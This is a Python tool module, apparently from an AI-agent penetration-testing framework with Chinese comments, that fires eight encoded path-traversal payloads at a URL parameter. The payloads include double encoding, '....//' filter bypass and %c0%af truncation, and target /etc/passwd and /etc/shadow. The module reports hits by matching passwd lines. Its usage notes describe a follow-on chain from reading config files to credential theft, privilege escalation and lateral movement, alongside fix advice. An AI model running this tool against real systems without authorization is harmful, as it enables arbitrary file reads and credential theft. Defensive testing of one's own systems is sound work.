"""目录穿越检测：对 FUZZ 占位注入编码绕过 payload，验证 /etc/passwd 可读。

白帽定位：拿到可疑文件参数后验证穿越——../../etc/passwd、URL 编码、
双编码、替换绕过（....//）、UTF-8 截断（%c0%af）等 8 种 payload，
响应含 root:/daemon: 即命中（读任意文件的前奏）。
"""

from __future__ import annotations

import re
from typing import Any

from .base import ToolProfile, check_installed

_URL_RE = re.compile(r"^https?://[^\s;|`$\\<>{}]{1,500}$", re.IGNORECASE)
_PAYLOAD_RE = re.compile(r"^[A-Za-z0-9%./_\\\-]{1,200}$")

_DEFAULT_PAYLOADS: list[str] = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",      # URL 编码 /
    "..%252f..%252f..%252f..%252fetc%252fpasswd",  # 双编码（WAF 二次解码）
    "....//....//....//etc/passwd",        # 替换过滤器绕过（../ 被删）
    "..%c0%af..%c0%af..%c0%afetc/passwd",  # UTF-8 截断绕过
    "../../../../etc/shadow",
    "/etc/passwd",                         # 绝对路径
    "..\\..\\..\\..\\etc\\passwd",          # Windows 风格
]
_PASSWD_RE = re.compile(r"^(root|daemon|nobody|bin|sys):", re.MULTILINE)
_MAX_PAYLOADS = 20

SCHEMAS: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "path_traversal",
            "description": (
                "目录穿越验证：对 URL 中 FUZZ 占位注入 8 种编码绕过 payload"
                "（../../etc/passwd、URL/双编码、....//替换绕过、%c0%af 截断等），"
                "响应含 root: 即命中（读任意文件前奏）。"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "含 FUZZ 占位的 URL，如 "
                                       "http://t.com/file.php?name=FUZZ",
                    },
                    "payloads": {
                        "type": "array",
                        "description": "自定义 payload 列表（可选，追加到内置 8 种）",
                        "items": {"type": "string"},
                    },
                },
                "required": ["url"],
            },
        },
    },
]


def _build_cmd(url: str) -> str:
    return f"curl -s -m 15 '{url}'"


def _is_passwd_hit(raw: str) -> bool:
    """响应中出现 passwd 文件特征行（root:/daemon:/nobody: 行首）。"""
    return bool(_PASSWD_RE.search(raw))


def _summarize(results: list[tuple[str, str]]) -> str:
    hits = [(p, raw) for p, raw in results if _is_passwd_hit(raw)]
    head: list[str] = []
    if hits:
        head.append(f"🚨 目录穿越命中 ({len(hits)}/{len(results)}):")
        for p, raw in hits:
            snippet = next(
                (l for l in raw.splitlines() if _PASSWD_RE.match(l)), raw[:80])
            head.append(f"  payload: {p}")
            head.append(f"    回显: {snippet[:80]}…")
        head.append("下一步：确认可读文件范围（/etc/shadow 可读=提权前奏）；"
                    "修复：参数白名单+路径规范化（realpath 校验）。")
    else:
        head.append("✅ 未命中——8 种编码 payload 均未读到 passwd 特征（可能已过滤或参数不生效）。")
        head.append("提示：尝试参数名变体（file/page/download）、/proc/self/environ、"
                    "配合 WAF 指纹选编码（wafw00f）。")
    return ToolProfile._summary("", head, tail=25)


class PathTraversalProfile(ToolProfile):
    name = "path_traversal"
    aliases = ["目录穿越", "路径穿越", "穿越检测", "lfi", "任意文件读取", "路径遍历", "path traversal"]
    summary = "目录穿越检测（编码绕过）"
    lore = """### 目录穿越检测使用要点
- 定位：文件参数（file/page/download/name）未过滤 ../ → 任意文件读取。
  FUZZ 占位写法：path_traversal(url='http://t.com/file.php?name=FUZZ')。
- 8 种 payload 覆盖常见防护：URL 编码（WAF 一次解码）、双编码（二次解码）、
  ....//（../ 被替换删除）、%c0%af（UTF-8 截断）、Windows 反斜杠。
- 判定：响应含 root:/daemon:/nobody: 行首 = 命中；/etc/shadow 可读=高价值。
- 结合流程：先 web_leak/page_scan 找参数 → path_traversal 验证 → 读源码/配置
  （如 /var/www/html/config.php）→ 找凭据 → 提权或横向。
- 修复：realpath 规范化 + 白名单目录校验 + 禁用编码解析差异（RFC 3986 严格解析）。
- 注意：echo/print 型（读后直接回显）与 download 型（二进制）判定不同；
  download 型看 Content-Type/长度变化，勿只看 root:。"""
    extra_schemas = SCHEMAS

    async def exec_path_traversal(self, ex: Any, args: dict[str, Any]) -> str:
        if not check_installed("curl"):
            return "curl 未安装（apt install curl）。"
        url = str(args.get("url") or "").strip()
        if not _URL_RE.match(url):
            return f"url 格式非法: {url!r}"
        if url.count("FUZZ") != 1:
            return "url 必须且只能包含一个 FUZZ 占位（如 http://t.com/file.php?name=FUZZ）。"
        payloads = list(_DEFAULT_PAYLOADS)
        extra = args.get("payloads") or []
        if not isinstance(extra, list):
            raise ValueError("payloads 必须是列表")
        for p in extra:
            p = str(p).strip()
            if not _PAYLOAD_RE.match(p):
                raise ValueError(f"payload 含非法字符: {p!r}")
            if p not in payloads:
                payloads.append(p)
        if len(payloads) > _MAX_PAYLOADS:
            raise ValueError(f"payload 总数不能超过 {_MAX_PAYLOADS}")
        results: list[tuple[str, str]] = []
        for p in payloads:
            raw = await self._run(ex, _build_cmd(url.replace("FUZZ", p)), timeout=20)
            results.append((p, raw))
        return _summarize(results)
